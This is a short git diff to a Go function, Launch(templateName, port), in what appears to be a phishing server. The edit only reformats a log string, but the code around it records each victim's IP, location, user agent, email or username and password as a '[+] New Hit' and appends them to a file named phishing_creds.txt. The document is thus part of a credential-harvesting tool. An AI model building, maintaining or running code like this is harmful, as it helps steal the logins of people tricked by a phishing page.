@@ -89,16 +89,17 @@ func Launch(templateName string, port int) {
 			}
 
 			// Log format
-			logEntry := fmt.Sprintf(`[+] New Hit (%s)
-IP: %s
-Location: %s
-User-Agent: %s
-Captured:
-  - Email/User: %s
-  - Password:   %s
+			logEntry := fmt.Sprintf(
+				`[+] New Hit (%s)
+				IP: %s
+				Location: %s
+				User-Agent: %s
+				Captured:
+				  - Email/User: %s
+				  - Password:   %s
 
--------------------------------
-`, time.Now().Format(time.RFC3339), ip, loc, ua, email, pass)
+				-------------------------------
+				`, time.Now().Format(time.RFC3339), ip, loc, ua, email, pass)
 
 			// Append to file
 			logFile := "phishing_creds.txt"
